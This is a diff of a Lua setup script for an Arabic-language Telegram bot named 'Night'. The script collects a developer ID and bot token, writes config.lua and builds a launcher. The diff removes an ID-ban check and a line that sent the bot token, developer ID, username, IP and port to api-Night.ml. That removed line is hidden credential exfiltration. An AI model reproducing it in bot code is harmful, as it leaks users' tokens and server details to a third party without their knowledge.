@@ -26,22 +26,12 @@ if not AliNight:get(Server.."IdNight") then
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
 local DevId = io.read():gsub(' ','') 
 if tostring(DevId):match('%d+') then 
-data,res = https.request("https://api-Night.ml/Night/index.php?Ban=Night&Info&Id="..DevId)
-if res == 200 then
-Abs = json:decode(data)
-if Abs.Result.Info == 'Is_Spam' then
-print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nعذرا هذا الايدي محظور من تنصيب هذا السورس\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
-os.execute('lua Night.lua') 
-end ---ifBn
-if Abs.Result.Info == 'Ok' then
 io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
 AliNight:set(Server.."IdNight",DevId) 
-end ---ifok
 else 
-print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
-end
+print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
+end 
 os.execute('lua Night.lua') 
-end
 end 
 if not AliNight:get(Server.."TokenNight") then 
 io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
@@ -49,16 +39,16 @@ local TokenBot = io.read()
 if TokenBot ~= '' then 
 local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe') 
 if res ~= 200 then 
-print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
+print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
 else 
 io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m') 
 AliNight:set(Server.."TokenNight",TokenBot) 
 end  
 else 
-print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
+print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
 end  
 os.execute('lua Night.lua') 
-end
+end 
 local Create = function(data, file, uglify)  
 file = io.open(file, "w+")   
 local serialized   
@@ -78,7 +68,6 @@ Night = AliNight:get(Server.."TokenNight"):match("(%d+)"),
 SudoIds = {AliNight:get(Server.."IdNight")},
 }
 Create(Config, "./config.lua") 
-https.request("https://api-Night.ml/Night/index.php?Get=Night&DevId="..AliNight:get(Server.."IdNight").."&TokenBot="..AliNight:get(Server.."TokenNight").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("Night.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -87,15 +76,15 @@ token="]]..AliNight:get(Server.."TokenNight")..[["
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
 echo "~ The tg File Was Not Found In The Bot Files!"
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
 exit 1
 fi
 if [ ! $token ]; then
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
 echo "~ The Token Was Not Found In The config.lua File!"
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
 exit 1
 fi
 ./tg -s ./Night.lua -p PROFILE --bot=$token
@@ -130,7 +119,7 @@ local config = loadfile("./config.lua")()
 return config 
 end  
 Load_Night() 
-print("\27[36m"..[[          
+print("\27[36m"..[[                                    
 --------------------------------------------
 |           > CH › @sheserlo0              |
 |        ~> DEVELOPER › @h_a_m_a_d_a77       |
